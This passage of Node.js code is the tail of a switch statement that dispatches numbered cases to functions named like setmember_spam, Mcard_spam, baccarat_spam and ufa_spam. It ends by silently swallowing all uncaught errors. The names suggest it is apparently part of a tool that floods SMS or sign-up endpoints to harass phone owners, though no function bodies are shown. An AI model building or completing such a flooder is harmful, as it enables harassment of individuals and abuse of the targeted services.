                            sk32()
                            break;
                        }                    
                        case 162: {
                            sk33()
                            break;
                        }                    
                        case 163: {
                            sk33()
                            break;
                        }                    
                        case 164: {
                            sk34()
                            break;
                        }                    
                        case 165: {
                            sk35()
                            break;
                        }                    
                        case 166: {
                            sk36()
                            break;
                        }        
                        case 167: {
                            sk37()
                            break;
                        }                  
                        case 168:{
                            sk38()
                            break;
                        }
                        case 169: {
                            getais();
                            break;
                        }
                        case 170: {
                            monomax();
                            break;
                        }
                        case 171: {
                            newapi();
                            break;
                        }
                        case 172: {
                            newapi2();
                            break;
                        }
                        case 173: {
                            newapi3();
                            break;
                        }
                        case 174: {
                            newapi4();
                            break;
                        }
                        case 175: {
                            newapi5();
                            break;
                        }
                        case 176: {
                            newapi6();
                            break;
                        }
                        case 177: {
                            newapi7();
                            break;
                        }
                        case 178: {
                            newapi8();
                            break;
                        }
                        case 179: {
                            newapi9();
                            break;
                        }
                        case 180: {
                            newapi10();
                            break;
                        }
                        case 181: {
                            setmember_spam();
                            break;
                        }
                        case 182: {
                            Mcard_spam();
                            break;
                        }
                        case 183: {
                            newapi15();
                            break;
                        }
                        case 184: {
                            newapi16();
                            break;
                        }
                        case 185: {
                            shopat24_spam()
                            break;
                        }
                        case 186: {
                            Mcard_spam()
                            break;
                        }
                        case 187: {
                            setmember_spam()
                            break;
                        }
                        case 188: {
                            baccarat_spam()
                            break;
                        }
                        case 189: {
                            pizza_spam()
                            break;
                        }
                        case 190: {
                            toyota_spam()
                            break;
                        }
                        case 191: {
                            QQmoney_spam()
                            break;
                        }
                        case 192: {
                            Mooncash_spam()
                            break;
                        }
                        case 193: {
                            Needmoney_spam()
                            break;
                        }
                        case 194: {
                            bet4u_spam()
                            break;
                        }
                        case 195: {
                            ufa_spam()
                            break;
                        }
                        case 196: {
                            sk1()
                            break;
                        }
                        case 197: {
                            sk2()
                            break;
                        }
                        case 198: {
                            sk3()
                            break;
                        }
                        case 199: {
                            sk4()
                            break;
                        }
                        case 200: {
                            sk5()
                            break;
                        }
                        case 201: {
                            newapi5()
                            break;
                        }
                        case 202: {
                            newapi5()
                            break;
                        }
                        case 203: {
                            newapi5()
                            break;
                        }                    
                        case 204: {
                            newapi5()
                            break;
                        }                    
                        case 205: {
                            newapi5()
                            break;
                        }                    
                        case 206: {
                            newapi5()
                            break;
                        }                    
                        case 207: {
                            newapi5()
                            break;
                        }                    
                        case 208: {
                            newapi5()
                            break;
                        }                    
                        case 209: {
                            newapi5()
                            break;
                        }                    
                        case 210: {
                            newapi5()
                            break;
                        }                    
                        case 211: {
                            newapi5()
                            break;
                        }                    
                        case 212: {
                            newapi5()
                            break;
                        }                    
                        case 213: {
                            newapi5()
                            break;
                        }                    
                        case 214: {
                            newapi5()
                            break;
                        }                    
                        case 215: {
                            newapi5()
                            break;
                        }                    
                        case 216: {
                            newapi5()
                            break;
                        }        
                        case 217: {
                            newapi5()
                            break;
                        }                  
                        case 218:{
                            newapi5()
                            break;
                        }
                        case 219: {
                            newapi5();
                            break;
                        }
                        case 220: {
                            newapi5();
                            break;
                        }
                        case 221: {
                            newapi5();
                            break;
                        }
                        case 222: {
                            newapi5();
                            break;
                        }
                        case 223: {
                            newapi5();
                            break;
                        }
                        case 224: {
                            newapi5();
                            break;
                        }
                        case 225: {
                            newapi5();
                            break;
                        }
                        case 226: {
                            newapi5();
                            break;
                        }
                        case 227: {
                            newapi5();
                            break;
                        }
                        case 228: {
                            newapi5();
                            break;
                        }
                        case 229: {
                            newapi5();
                            break;
                        }
                        case 230: {
                            newapi5();
                            break;
                        }
                        case 231: {
                            newapi5();
                            break;
                        }
                        case 232: {
                            newapi5();
                            break;
                        }
                        case 233: {
                            newapi5();
                            break;
                        }
                        case 234: {
                            newapi5();
                            break;
                        }
                        case 235: {
                            newapi5()
                            break;
                        }
                        case 236: {
                            newapi5()
                            break;
                        }
                        case 237: {
                            newapi5()
                            break;
                        }
                        case 238: {
                            newapi5()
                            break;
                        }
                        case 239: {
                            newapi5()
                            break;
                        }
                        case 240: {
                            newapi5()
                            break;
                        }
                        case 241: {
                            newapi5()
                            break;
                        }
                        case 242: {
                            newapi5()
                            break;
                        }
                        case 243: {
                            newapi5()
                            break;
                        }
                        case 244: {
                            newqpi5()
                            break;
                        }
                        case 245: {
                            newapi5()
                            break;
                        }
                        case 246: {
                            newapi5()
                            break;
                        }
                        case 247: {
                            newapi5()
                            break;
                        }
                        case 248: {
                            newapi5()
                            break;
                        }
                        case 249: {
                            newapi5()
                            break;
                        }
                        case 250: {
                            newapi5()
                            break;
                        }
                        case 251: {
                            sk28()
                            break;
                        }
                        case 252: {
                            sk28()
                            break;
                        }
                        case 253: {
                            sk28()
                            break;
                        }
                        case 254: {
                            sk28()
                            break;
                        }                    
                        case 255: {
                            sk28()
                            break;
                        }                    
                        case 256: {
                            sk28()
                            break;
                        }                    
                        case 257: {
                            sk28()
                            break;
                        }                    
                        case 258: {
                            sk28()
                            break;
                        }                    
                        case 259: {
                            sk28()
                            break;
                        }                    
                        case 260: {
                            sk28()
                            break;
                        }                    
                        case 261: {
                            sk28()
                            break;
                        }                    
                        case 262: {
                           sk28()
                            break;
                        }                    
                        case 263: {
                            sk28()
                            break;
                        }                    
                        case 264: {
                            sk28()
                            break;
                        }                    
                        case 265: {
                            sk28()
                            break;
                        }                    
                        case 266: {
                            sk28()
                            break;
                        }                    
                        case 267: {
                            sk28()
                            break;
                        }        
                        case 268: {
                            sk28()
                            break;
                        }                  
                        case 269:{
                            sk28()
                            break;
                        }
                        case 270: {
                            sk28();
                            break;
                        }
                        case 271: {
                            sk28();
                            break;
                        }
                        case 272: {
                            sk28();
                            break;
                        }
                        case 273: {
                            sk28();
                            break;
                        }
                        case 274: {
                            sk28();
                            break;
                        }
                        case 275: {
                            sk28();
                            break;
                        }
                        case 276: {
                            sk28();
                            break;
                        }
                        case 277: {
                            sk28();
                            break;
                        }
                        case 278: {
                            sk28();
                            break;
                        }
                        case 279: {
                            sk28();
                            break;
                        }
                        case 280: {
                            sk28();
                            break;
                        }
                        case 281: {
                            sk28();
                            break;
                        }
                        case 282: {
                            sk28();
                            break;
                        }
                        case 283: {
                            sk28();
                            break;
                        }
                        case 284: {
                            sk28();
                            break;
                        }
                        case 285: {
                            sk28();
                            break;
                        }
                        case 286: {
                            sk28()
                            break;
                        }
                        case 287: {
                            sk28()
                            break;
                        }
                        case 288: {
                            sk28()
                            break;
                        }
                        case 289: {
                            sk28()
                            break;
                        }
                        case 290: {
                            sk28()
                            break;
                        }
                        case 291: {
                            sk28()
                            break;
                        }
                        case 292: {
                            sk28()
                            break;
                        }
                        case 293: {
                            sk28()
                            break;
                        }
                        case 294: {
                            sk28()
                            break;
                        }
                        case 295: {
                            sk28()
                            break;
                        }
                        case 296: {
                            sk28()
                            break;
                        }
                        case 297: {
                            sk28()
                            break;
                        }
                        case 298: {
                            sk28()
                            break;
                        }
                        case 299: {
                            sk28()
                            break;
                        }
                        case 300: {
                            sk28()
                            break;
                        }
                        case 301: {
                            sk28()
                            break;
                        }
                     }
                }
            });
        }
    
    process.on('uncaughtException', function (err) {});
    process.on('unhandledRejection', function (err) {});
    

